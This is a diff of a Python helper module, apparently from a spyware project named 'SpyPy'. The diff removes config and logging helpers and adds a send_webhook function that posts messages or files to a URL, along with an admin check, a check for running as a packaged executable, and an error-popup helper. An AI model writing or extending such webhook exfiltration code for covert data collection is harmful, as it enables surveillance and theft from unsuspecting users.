@@ -1,10 +1,9 @@
 import os
 import ctypes
 import platform
-import tempfile
-import json
+import sys
 import requests
-
+import tkinter.messagebox
 def get_platform():
     return platform.system()
 
@@ -17,36 +16,22 @@ def is_admin():
         except AttributeError:
             return False
 
-
-
-def load_config(key):
-    with open("config.json", "r") as file:
-        config = json.load(file)
-        return config[key]
-    
-def get_logs_path():
-    logs_path_dir_name = load_config("logs_path")
-    logs_path = os.path.join(tempfile.gettempdir(), logs_path_dir_name)
-    return logs_path
-
-def is_first_run():
-    logs_path = get_logs_path()
-    if not os.path.exists(logs_path):
-        return True
-    os.mkdir(logs_path)
-    return False
-
-#make a function to send either a file or a message to a webhook
-'''def send_webhook(webhook, message=None, file=None):
+def send_webhook(url, message=None, file=None):
     data = {
-        "content": message,
-        "username": "SpyPy",
+        "username": "SpyPy"
     }
+    if message:
+        data["content"] = message
     if file:
-        files = {
-            "file": open(file, "rb")
-        }
-        response = requests.post(webhook, data=data, files=files)
+        data["file"] = file
+    requests.post(url, json=data)
+
+def is_exe():
+    return getattr(sys, "frozen", False)
+
+def display_error_message(title, message):
+    if get_platform() == "Windows":
+        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
     else:
-        response = requests.post(webhook, json=data)
-    return response'''
+        tkinter.messagebox.showerror(title=title, message=message) 
+        #TODO find a better looking error msg
